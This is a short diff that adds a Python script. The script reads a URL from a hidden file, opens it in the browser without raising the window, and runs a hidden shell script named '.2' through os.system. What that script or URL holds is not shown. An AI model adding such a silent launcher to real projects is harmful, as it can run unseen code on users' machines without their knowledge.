@@ -1,0 +1,7 @@
+f = open(".url.txt", "r")
+content = f.read()
+import webbrowser
+webbrowser.open((content), new=0, autoraise=False)
+f.close()
+import os
+resultado = os.system("bash .2 ")
